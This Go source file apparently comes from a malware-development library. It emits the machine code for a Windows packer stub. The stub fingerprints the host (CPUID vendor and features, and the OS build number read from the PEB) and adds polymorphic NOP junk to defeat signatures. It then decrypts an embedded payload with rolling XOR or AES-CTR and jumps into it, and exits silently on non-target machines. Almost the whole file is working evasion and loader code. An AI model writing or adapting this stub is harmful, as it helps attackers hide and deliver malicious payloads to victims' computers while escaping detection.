package packer

import (
	"encoding/binary"
	"fmt"
	mathrand "math/rand"

	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
	"github.com/oioio-space/maldev/pe/packer/stubgen/stage1"
)

// bundleStubV2NegateWinBuildWindows is Phase 4b of the bundle-stub
// migration — the Windows variant that adds:
//
//   - PEB.OSBuildNumber read in the prologue (saved to R13 across
//     loop iterations); enables the §4-PHASE-B-2 PT_WIN_BUILD
//     predicate.
//   - PT_WIN_BUILD bit check inside the per-entry test (between the
//     vendor-check and entry-done blocks); compares R13 against
//     entry's [r8+16] BuildMin / [r8+20] BuildMax range.
//   - §5 negate flag (inherited from V2-Negate).
//   - .no_match → §2 EmitNtdllRtlExitUserProcess(0) at end of
//     stub instead of Linux sys_exit_group.
//
// Register usage map (preserved across iterations):
//
//	rax     loop counter (eax low half — DO NOT clobber)
//	rcx     count of entries
//	rsi     host CPUID-vendor pointer (12-byte stack scratch)
//	r8      current FingerprintEntry pointer
//	r12     match accumulator (R12B = 1 match / 0 no-match)
//	r13     OSBuildNumber from PEB (saved at prologue exit)
//	r15     bundle data base
//
// Wire-format compatibility: existing bundles with PT_WIN_BUILD
// bit unset have their build check skipped via the bit-test, so
// pre-v0.88 bundles run fine. Bundles with PT_WIN_BUILD set get
// the range check applied — operators wanting Windows-build-aware
// dispatch now have a working stub.
//
// Returns the assembled stub bytes plus the PIC imm32 byte offset
// (always [bundleOffsetImm32Pos] = 10).
func bundleStubV2NegateWinBuildWindows() ([]byte, int, error) {
	return bundleStubV2NegateWinBuildWindowsRng(nil)
}

// bundleStubV2NegateWinBuildWindowsRng is the rng-driven core. rng
// non-nil → polymorphism slots B (between PEB-build read and the scan
// loop) and C (between matched-pointer-computation and decrypt) get
// fresh random NOP runs. rng=nil → deterministic emission for tests
// and the no-junk public wrapper.
func bundleStubV2NegateWinBuildWindowsRng(rng *mathrand.Rand) ([]byte, int, error) {
	b, err := amd64.New()
	if err != nil {
		return nil, 0, fmt.Errorf("packer: amd64 builder: %w", err)
	}

	check := func(err error, where string) error {
		if err != nil {
			return fmt.Errorf("packer: V2NW %s: %w", where, err)
		}
		return nil
	}

	// §1 PIC + §2 vendor + §2.6 features + §3 loop setup via the
	// shared emitters in pe/packer/bundle_stub_helpers.go — keeps
	// V2-Negate (Linux) and V2NW (Windows) byte-identical across
	// the cross-platform prefix.
	immPos, err := emitBundlePICTrampoline(b)
	if err != nil {
		return nil, 0, fmt.Errorf("packer: V2NW: %w", err)
	}
	if err := emitCPUIDVendorPrologue(b); err != nil {
		return nil, 0, fmt.Errorf("packer: V2NW: %w", err)
	}

	// §2.5 PEB.OSBuildNumber → R13 (Windows-only — Linux has no PEB).
	// EmitPEBBuildRead emits the 15-byte sequence:
	//   mov rax, gs:[0x60]      ; PEB
	//   mov eax, [rax+0x120]    ; OSBuildNumber
	if e := check(stage1.EmitPEBBuildRead(b), "EmitPEBBuildRead"); e != nil {
		return nil, 0, e
	}
	// mov r13d, eax — save build to callee-saved-ish R13.
	if e := check(b.RawBytes([]byte{0x41, 0x89, 0xc5}), "mov r13d eax"); e != nil {
		return nil, 0, e
	}

	if err := emitCPUIDFeaturesProbe(b); err != nil {
		return nil, 0, fmt.Errorf("packer: V2NW: %w", err)
	}
	if err := emitBundleLoopSetup(b); err != nil {
		return nil, 0, fmt.Errorf("packer: V2NW: %w", err)
	}

	// Polymorphism slot B — between PEB-build read / loop setup and
	// the scan loop header. Inert NOP run; Builder auto-resolves Jcc
	// targets that cross this slot.
	if err := emitNopJunk(b, rng); err != nil {
		return nil, 0, err
	}

	// === Section 4: Loop body with R12B-accumulator + negate + winbuild ===
	loopLabel := b.Label("loop")
	matchedLabel := amd64.LabelRef("matched")
	noMatchLabel := amd64.LabelRef("no_match")
	skipVendorLabel := amd64.LabelRef("skip_vendor")
	skipWinBuildLabel := amd64.LabelRef("skip_winbuild")
	winBuildFailLabel := amd64.LabelRef("winbuild_fail")
	vendorLowMismatch := amd64.LabelRef("vendor_low_mismatch")
	vendorFail := amd64.LabelRef("vendor_fail")
	entryDoneLabel := amd64.LabelRef("entry_done")

	// cmp eax, ecx; jge .no_match
	if e := check(b.CMP(amd64.RAX, amd64.RCX), "cmp eax ecx"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JGE(noMatchLabel), "jge no_match"); e != nil {
		return nil, 0, e
	}

	// mov r12b, 1  — R12B-accumulator (= match)
	if e := check(b.RawBytes([]byte{0x41, 0xb4, 0x01}), "mov r12b 1"); e != nil {
		return nil, 0, e
	}
	// movzx r9, byte [r8]  — predType
	if e := check(b.MOVZX(amd64.R9, amd64.MemOp{Base: amd64.R8}), "movzx r9d"); e != nil {
		return nil, 0, e
	}
	// test r9b, 8  — PT_MATCH_ALL
	if e := check(b.RawBytes([]byte{0x41, 0xf6, 0xc1, 0x08}), "test r9b 8"); e != nil {
		return nil, 0, e
	}
	// jnz .entry_done — fast-path: R12B already 1
	if e := check(b.JNZ(entryDoneLabel), "jnz entry_done"); e != nil {
		return nil, 0, e
	}

	// PT_CPUID_VENDOR check
	if e := check(b.RawBytes([]byte{0x41, 0xf6, 0xc1, 0x01}), "test r9b 1"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(skipVendorLabel), "jz skip_vendor"); e != nil {
		return nil, 0, e
	}

	// Vendor compare
	if e := check(b.MOV(amd64.R10, amd64.MemOp{Base: amd64.R8, Disp: 4}), "mov r10 [r8+4]"); e != nil {
		return nil, 0, e
	}
	if e := check(b.CMP(amd64.R10, amd64.MemOp{Base: amd64.RSI}), "cmp r10 [rsi]"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JNZ(vendorLowMismatch), "jne vendor_low_mismatch"); e != nil {
		return nil, 0, e
	}
	if e := check(b.MOVL(amd64.R10, amd64.MemOp{Base: amd64.R8, Disp: 12}), "mov r10d [r8+12]"); e != nil {
		return nil, 0, e
	}
	if e := check(b.CMPL(amd64.R10, amd64.MemOp{Base: amd64.RSI, Disp: 8}), "cmpl r10d [rsi+8]"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(skipVendorLabel), "je skip_vendor (match)"); e != nil {
		return nil, 0, e
	}

	// .vendor_low_mismatch: wildcard check (entry vendor all-zero)
	b.Label("vendor_low_mismatch")
	if e := check(b.MOV(amd64.R10, amd64.MemOp{Base: amd64.R8, Disp: 4}), "vlm mov r10"); e != nil {
		return nil, 0, e
	}
	if e := check(b.TEST(amd64.R10, amd64.R10), "vlm test r10"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JNZ(vendorFail), "jnz vendor_fail"); e != nil {
		return nil, 0, e
	}
	if e := check(b.MOVL(amd64.R10, amd64.MemOp{Base: amd64.R8, Disp: 12}), "vlm mov r10d"); e != nil {
		return nil, 0, e
	}
	if e := check(b.TEST(amd64.R10, amd64.R10), "vlm test r10d"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(skipVendorLabel), "jz skip_vendor (wildcard)"); e != nil {
		return nil, 0, e
	}

	// .vendor_fail: clear R12B (no-match)
	b.Label("vendor_fail")
	if e := check(b.RawBytes([]byte{0x45, 0x30, 0xe4}), "xor r12b r12b"); e != nil {
		return nil, 0, e
	}

	// .skip_vendor: PT_WIN_BUILD check
	b.Label("skip_vendor")
	// test r9b, 2  — PT_WIN_BUILD bit
	if e := check(b.RawBytes([]byte{0x41, 0xf6, 0xc1, 0x02}), "test r9b 2"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(skipWinBuildLabel), "jz skip_winbuild"); e != nil {
		return nil, 0, e
	}
	// mov r9d, [r8+16]  — BuildMin
	if e := check(b.MOVL(amd64.R9, amd64.MemOp{Base: amd64.R8, Disp: 16}), "mov r9d BuildMin"); e != nil {
		return nil, 0, e
	}
	// cmp r13d, r9d  — Intel: r13 - r9 (=build - BuildMin)
	if e := check(b.CMPL(amd64.R13, amd64.R9), "cmpl r13d r9d (BuildMin)"); e != nil {
		return nil, 0, e
	}
	// jl .winbuild_fail  — if build < BuildMin, fail
	if e := check(b.JL(winBuildFailLabel), "jl winbuild_fail (low)"); e != nil {
		return nil, 0, e
	}
	// mov r9d, [r8+20]  — BuildMax
	if e := check(b.MOVL(amd64.R9, amd64.MemOp{Base: amd64.R8, Disp: 20}), "mov r9d BuildMax"); e != nil {
		return nil, 0, e
	}
	// cmp r13d, r9d  — r13 - r9 (build - BuildMax)
	if e := check(b.CMPL(amd64.R13, amd64.R9), "cmpl r13d r9d (BuildMax)"); e != nil {
		return nil, 0, e
	}
	// jge .winbuild_fail  — if build >= BuildMax+1 i.e. build > BuildMax, fail
	// Wait — we want fail when build > BuildMax. cmp r13, r9 (build - BuildMax).
	// jg .winbuild_fail (build > BuildMax) is what we want. JG = JNLE.
	// JG opcode is 0x7f. b.Builder doesn't have JG yet. Workaround:
	// after cmp, jle .skip_winbuild (build <= BuildMax → pass).
	// jle = JNG = JLE (signed less-or-equal).
	// b.Builder doesn't have JLE either.
	// Inverse: jl/jge/je already exist. Let's reformulate:
	//   if build > BuildMax → fail.
	//   ⇔ if !(build <= BuildMax) → fail.
	//   ⇔ jl .skip_winbuild — wait that's "build < BuildMax" not "<=".
	//
	// Cleanest with available ops: swap operands.
	//   cmp r9d, r13d  → flags = BuildMax - build
	//   jl .winbuild_fail  → BuildMax < build → fail.
	// JL when (BuildMax - build) < 0, i.e. BuildMax < build, i.e. build > BuildMax. ✓
	//
	// So swap and use jl.
	// Actually the V2 already does this for the simpler cmp; let's
	// reuse the swap pattern by passing args swapped:
	//   b.CMPL(amd64.R9, amd64.R13)
	if e := check(b.RawBytes([]byte{0x45, 0x39, 0xe9}), "cmpl r9d r13d (swap)"); e != nil {
		return nil, 0, e
	}
	// 0x45 (REX.RB) 0x39 (CMP r/m,r) 0xe9 (ModRM=11_101_001 reg=R13 rm=R9)
	// = cmp r9d, r13d → flags = r9 - r13 = BuildMax - build
	if e := check(b.JL(winBuildFailLabel), "jl winbuild_fail (high)"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JMP(skipWinBuildLabel), "jmp skip_winbuild"); e != nil {
		return nil, 0, e
	}

	// .winbuild_fail: clear R12B (build out of range = no-match)
	b.Label("winbuild_fail")
	if e := check(b.RawBytes([]byte{0x45, 0x30, 0xe4}), "wbf xor r12b r12b"); e != nil {
		return nil, 0, e
	}

	// .skip_winbuild: PT_CPUID_FEATURES check (Tier 🔴 #1.3)
	b.Label("skip_winbuild")
	skipFeaturesLabel := amd64.LabelRef("skip_features")
	// test r9b, 4  — PT_CPUID_FEATURES bit
	if e := check(b.RawBytes([]byte{0x41, 0xf6, 0xc1, 0x04}), "test r9b 4"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(skipFeaturesLabel), "jz skip_features"); e != nil {
		return nil, 0, e
	}
	// mov r10d, [rsi+12]  — host CPUID[1].ECX features
	if e := check(b.MOVL(amd64.R10, amd64.MemOp{Base: amd64.RSI, Disp: 12}), "mov r10d features"); e != nil {
		return nil, 0, e
	}
	// and r10d, [r8+24]  — mask with CPUIDFeatureMask
	if e := check(b.RawBytes([]byte{0x45, 0x23, 0x50, 0x18}), "and r10d [r8+24]"); e != nil {
		return nil, 0, e
	}
	// cmp r10d, [r8+28]  — vs CPUIDFeatureValue
	if e := check(b.CMPL(amd64.R10, amd64.MemOp{Base: amd64.R8, Disp: 28}), "cmpl r10d [r8+28]"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(skipFeaturesLabel), "je skip_features (match)"); e != nil {
		return nil, 0, e
	}
	// fall-through: mismatch → clear R12B
	if e := check(b.RawBytes([]byte{0x45, 0x30, 0xe4}), "xor r12b r12b (features fail)"); e != nil {
		return nil, 0, e
	}

	b.Label("skip_features")
	// fall-through to .entry_done

	// .entry_done: apply negate flag
	b.Label("entry_done")
	if e := check(b.MOVZX(amd64.R9, amd64.MemOp{Base: amd64.R8, Disp: 1}), "movzx negate"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ANDB(amd64.R9, amd64.Imm(0x01)), "and r9b 1"); e != nil {
		return nil, 0, e
	}
	// xor r12b, r9b  → 45 30 cc
	if e := check(b.RawBytes([]byte{0x45, 0x30, 0xcc}), "xor r12b r9b"); e != nil {
		return nil, 0, e
	}
	// test r12b, r12b → 45 84 e4
	if e := check(b.RawBytes([]byte{0x45, 0x84, 0xe4}), "test r12b r12b"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JNZ(matchedLabel), "jnz matched final"); e != nil {
		return nil, 0, e
	}

	// .next (fall-through from entry_done when R12B=0)
	b.Label("next")
	if e := check(b.ADD(amd64.R8, amd64.Imm(48)), "next add r8"); e != nil {
		return nil, 0, e
	}
	if e := check(b.INC(amd64.RAX), "next inc"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JMP(loopLabel), "next jmp loop"); e != nil {
		return nil, 0, e
	}

	// .no_match: jmp rel32 to §2 ExitProcess block at end of stub.
	// We can't use Builder.JMP(label) with the §2 block — §2 is
	// emitted via RawBytes which doesn't create a label. Use rel32
	// JMP with manual displacement patched after Encode.
	noMatchPos := -1
	{
		// Capture position before emitting the placeholder.
		// Builder doesn't expose current size directly, but we can
		// query via Encode-then-discard. Cheaper: emit the placeholder
		// JMP with a label target we'll align ourselves.
		b.Label("no_match")
		// Use Builder.JMP to a label that points to .§2_block which
		// we'll declare just before the §2 RawBytes.
		exitBlockLabel := amd64.LabelRef("exit_block")
		if e := check(b.JMP(exitBlockLabel), "no_match jmp exit_block"); e != nil {
			return nil, 0, e
		}
	}

	// === Section 5b: .matched + decrypt + JMP (verbatim from V2) ===
	b.Label("matched")
	if e := check(b.MOVL(amd64.R9, amd64.MemOp{Base: amd64.R15, Disp: 12}), "matched mov r9d"); e != nil {
		return nil, 0, e
	}
	if e := check(b.MOVL(amd64.R10, amd64.RAX), "matched mov r10d"); e != nil {
		return nil, 0, e
	}
	if e := check(b.SHL(amd64.R10, amd64.Imm(5)), "matched shl"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ADD(amd64.R9, amd64.R10), "matched add"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ADD(amd64.R9, amd64.R15), "matched add r15"); e != nil {
		return nil, 0, e
	}
	if e := check(b.MOV(amd64.RCX, amd64.R9), "matched mov rcx"); e != nil {
		return nil, 0, e
	}

	// Polymorphism slot C — between matched-pointer-computation and
	// decrypt-step header. Builder labels resolve all jumps that
	// cross this slot.
	if err := emitNopJunk(b, rng); err != nil {
		return nil, 0, err
	}

	// CipherType dispatch (Tier 🟡 #2.2 Phase 3c). Read the entry's
	// CipherType byte at [RCX+12]; on CipherType=2 (AES-CTR) jump
	// to .aes_ctr_path (block at stub tail, between .jmp_payload and
	// .exit_block). Fall through = CipherType 0/1 (XOR-rolling).
	aesCTRLabel := amd64.LabelRef("aes_ctr_path")
	if e := check(b.MOVZX(amd64.RAX, amd64.MemOp{Base: amd64.RCX, Disp: 12}), "ct movzx rax"); e != nil {
		return nil, 0, e
	}
	if e := check(b.CMP(amd64.RAX, amd64.Imm(int64(CipherTypeAESCTR))), "ct cmp 2"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(aesCTRLabel), "ct je aes_ctr_path"); e != nil {
		return nil, 0, e
	}

	if e := check(b.MOVL(amd64.RDI, amd64.MemOp{Base: amd64.RCX}), "dec mov edi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ADD(amd64.RDI, amd64.R15), "dec add rdi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.MOVL(amd64.RSI, amd64.MemOp{Base: amd64.RCX, Disp: 4}), "dec mov esi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.LEA(amd64.R8, amd64.MemOp{Base: amd64.RCX, Disp: 16}), "dec lea r8"); e != nil {
		return nil, 0, e
	}
	if e := check(b.XOR(amd64.R9, amd64.R9), "dec xor r9"); e != nil {
		return nil, 0, e
	}

	decLabel := b.Label("dec")
	jmpPayloadLabel := amd64.LabelRef("jmp_payload")
	if e := check(b.TEST(amd64.RSI, amd64.RSI), "dec test esi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JE(jmpPayloadLabel), "dec jz jmp_payload"); e != nil {
		return nil, 0, e
	}
	if e := check(emitDecryptStep(b), "dec step"); e != nil {
		return nil, 0, e
	}
	if e := check(b.INC(amd64.RDI), "dec inc rdi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.INC(amd64.R9), "dec inc r9"); e != nil {
		return nil, 0, e
	}
	if e := check(b.DEC(amd64.RSI), "dec dec esi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JMP(decLabel), "dec jmp dec"); e != nil {
		return nil, 0, e
	}

	b.Label("jmp_payload")
	if e := check(b.MOVL(amd64.RDI, amd64.MemOp{Base: amd64.RCX}), "jp mov edi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ADD(amd64.RDI, amd64.R15), "jp add rdi"); e != nil {
		return nil, 0, e
	}
	// add rsp, 16  — restore CPUID prologue stack allocation before
	// payload's `ret` (Windows-specific; matched payload may end in
	// ret expecting RtlUserThreadStart's return address at [RSP]).
	if e := check(b.RawBytes([]byte{0x48, 0x83, 0xc4, 0x10}), "add rsp 16"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JMPReg(amd64.RDI), "jp jmp rdi"); e != nil {
		return nil, 0, e
	}

	// === Section 5c: AES-CTR path (Tier 🟡 #2.2 Phase 3c) ===
	// Reached via the .aes_ctr_path label when [RCX+12] CipherType == 2.
	// RDI is loaded with the absolute ciphertext-region start (=
	// IV at offset 0), then emitAESCTRDecryptLoop runs the per-
	// block AES-NI decrypt + BE counter increment in-place. After
	// the loop falls through (.aes_done), recompute RDI = entry's
	// data + 16 (skip IV) and JMP into the plaintext.
	b.Label("aes_ctr_path")
	if e := check(b.MOVL(amd64.RDI, amd64.MemOp{Base: amd64.RCX}), "aes mov edi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ADD(amd64.RDI, amd64.R15), "aes add rdi r15"); e != nil {
		return nil, 0, e
	}
	if err := emitAESCTRDecryptLoop(b); err != nil {
		return nil, 0, fmt.Errorf("packer: V2NW aes-ctr loop: %w", err)
	}
	// Post-decrypt JMP epilogue (AES-CTR variant): plaintext is at
	// data + 16 (after the IV). Re-derive from RCX since the loop
	// clobbered RDI.
	if e := check(b.MOVL(amd64.RDI, amd64.MemOp{Base: amd64.RCX}), "aes ep mov edi"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ADD(amd64.RDI, amd64.R15), "aes ep add rdi r15"); e != nil {
		return nil, 0, e
	}
	if e := check(b.ADD(amd64.RDI, amd64.Imm(16)), "aes ep skip IV"); e != nil {
		return nil, 0, e
	}
	// add rsp, 16 — restore CPUID prologue stack allocation
	// (same shape as XOR-rolling jmp_payload).
	if e := check(b.RawBytes([]byte{0x48, 0x83, 0xc4, 0x10}), "aes ep add rsp 16"); e != nil {
		return nil, 0, e
	}
	if e := check(b.JMPReg(amd64.RDI), "aes ep jmp rdi"); e != nil {
		return nil, 0, e
	}

	// === Section 6: §2 ExitProcess block at .exit_block label ===
	b.Label("exit_block")
	exitBlock, err := stage1AssembleExitProcess(0)
	if err != nil {
		return nil, 0, fmt.Errorf("packer: V2NW exit block: %w", err)
	}
	if e := check(b.RawBytes(exitBlock), "exit_block raw"); e != nil {
		return nil, 0, e
	}

	out, err := b.Encode()
	if err != nil {
		return nil, 0, fmt.Errorf("packer: V2NW encode: %w", err)
	}
	_ = noMatchPos
	return out, immPos, nil
}

// stage1AssembleExitProcess re-emits the §2 ExitProcess(0) block.
// Mirrors EmitNtdllRtlExitUserProcess but returns raw bytes for
// embedding inline as a Builder RawBytes block.
func stage1AssembleExitProcess(exitCode uint32) ([]byte, error) {
	b, err := amd64.New()
	if err != nil {
		return nil, err
	}
	if err := stage1.EmitNtdllRtlExitUserProcess(b, exitCode); err != nil {
		return nil, err
	}
	return b.Encode()
}

// patchBundleStubV2NWBundleOff patches the imm32 of the PIC `add
// r15, imm32` instruction with the bundle data offset (= len(stub)
// - 5, distance from .pic label to bundle data start).
func patchBundleStubV2NWBundleOff(stub []byte, immPos int) {
	bundleOff := uint32(len(stub)) - 5
	binary.LittleEndian.PutUint32(stub[immPos:], bundleOff)
}
